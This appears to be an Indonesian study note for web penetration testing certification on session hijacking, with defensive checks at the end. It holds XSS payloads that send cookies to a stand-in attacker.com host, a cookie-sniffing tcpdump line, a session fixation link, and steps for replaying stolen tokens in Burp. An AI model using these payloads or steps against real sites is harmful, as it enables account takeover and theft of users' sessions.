2026-02-04 17:44

Status:

Tags:[[eWPTX]] [[Authentication]] [[Session Management]]
###### Prasyarat: [[Session Management Testing]]
# Pembajakan Sesi (Session Hijacking)

## Definisi

Session hijacking (pencurian cookie/token sesi) terjadi saat penyerang mendapatkan token sesi yang masih aktif lalu menggunakannya untuk menyamar sebagai korban.

---

## Cara kerja (high level)

1) sesi terbentuk: user login → server menerbitkan session ID
2) token dicegat/dicuri: penyerang mendapatkan session ID (berbagai jalur)
3) takeover: penyerang me-replay token ke aplikasi
4) eksploitasi: penyerang beraksi sebagai korban

---

## Cara token biasanya dicuri

- sniffing (traffic tidak terenkripsi)
- MitM interception
- pencurian cookie via XSS (jika cookie tidak `HttpOnly`)
- session ID lemah/prediktabel

---

## Teknik Serangan (detail)

### XSS-Based Session Theft

Jika cookie sesi tidak memakai `HttpOnly`, JavaScript bisa membacanya langsung:

```html
<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>
```

Variasi payload untuk konteks berbeda:

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<svg onload="navigator.sendBeacon('https://attacker.com/steal',document.cookie)">
```

### Network Sniffing

Saat traffic tidak terenkripsi (HTTP), token sesi lewat dalam cleartext:

- **Wireshark**: filter with `http.cookie` to isolate session tokens in captured traffic
- **Bettercap**: use for ARP spoofing on local networks to intercept traffic between victim and gateway
- **tcpdump**: `tcpdump -i eth0 -A 'port 80' | grep -i 'cookie'`

Catatan: kalau aplikasi sudah HTTPS end-to-end dan cookie memakai `Secure`, skenario sniffing berbasis HTTP biasanya tidak relevan.

### Session Fixation vs Hijacking

| Aspek | Session Fixation | Session Hijacking |
|--------|-----------------|-------------------|
| Timing | Sebelum autentikasi | Setelah autentikasi |
| Metode | Penyerang men-set/memaksa session ID yang sudah diketahui ke korban | Penyerang mencuri session ID yang sudah valid |
| Flow | Penyerang “tanam” token → korban login → token jadi terprivilege | Korban login → penyerang mencuri/menyadap token |

Contoh session fixation: penyerang mengirim link dengan session ID yang sudah ditentukan:
```
https://target.com/login?PHPSESSID=attacker_known_value
```

### Session Prediction

Token sesi yang lemah bisa ditebak/diprediksi:

- **Sequential IDs**: incrementing integers (`session=10001`, `session=10002`)
- **Timestamp-based**: tokens derived from `time()` or epoch values
- **Weak PRNG**: predictable random number generators (e.g., `rand()` in PHP without proper seeding)
- **Short tokens**: insufficient entropy, vulnerable to brute-force

---

## Burp Suite Methodology

### Sequencer (Entropy Analysis)

1. Tangkap request/response yang menghasilkan session token (biasanya response setelah login)
2. Kirim ke Sequencer → set lokasi token
3. Jalankan live capture (kumpulkan 10.000+ token jika memungkinkan)
4. Analisis: kualitas umum, analisis karakter, analisis bit
5. Token yang bagus biasanya menunjukkan >100 bit *effective entropy*

### Replaying Stolen Tokens

1. Tangkap request yang sudah terautentikasi di Proxy
2. Kirim ke Repeater
3. Ganti nilai cookie sesi dengan token hasil curian
4. Kirim request — jika 200 OK dan kontennya masih authenticated, hijack terkonfirmasi

---

## Real-World Testing Approach

### Token Randomness Checks

- Kumpulkan 100+ token sesi lalu cari pola
- Cek apakah ada data terstruktur yang di-base64 (decode lalu inspeksi)
- Pastikan token berubah tiap login / saat privilege berubah (rotasi)
- Pastikan panjang token memadai (idealnya >128 bit randomness)

### Cookie Flag Audit

| Flag | Tujuan | Cara uji |
|------|---------|------|
| `Secure` | Hanya terkirim via HTTPS | Coba akses via HTTP — cookie ikut terkirim? |
| `HttpOnly` | Tidak bisa dibaca JS | Jalankan `document.cookie` di console |
| `SameSite=Strict/Lax` | Menahan cross-site | Tes request cross-origin model CSRF |
| `Path` | Membatasi scope path | Cek apakah cookie ikut ke path yang tidak semestinya |
| `Expires/Max-Age` | Mengatur umur | Cek apakah sesi bertahan terlalu lama |

---

## Defensive checks

- paksa HTTPS + cookie `Secure`
- set `HttpOnly` dan `SameSite` yang sesuai
- regenerasi/rotasi session ID saat login dan saat privilege berubah (mis. `session_regenerate_id(true)` di PHP)
- opsional: ikat sesi ke sinyal risiko dengan hati-hati (IP/UA/device)
- terapkan absolute timeout (mis. 30 menit) dan idle timeout (mis. 10 menit)
- logout harus meng-invalidate sesi di server-side (bukan cuma hapus cookie di client)
- gunakan token panjang dan kriptografis random (mis. `/dev/urandom`, `secrets.token_hex(32)` di Python)
- monitor sesi paralel dari IP berbeda (alert/terminate sesuai kebijakan)
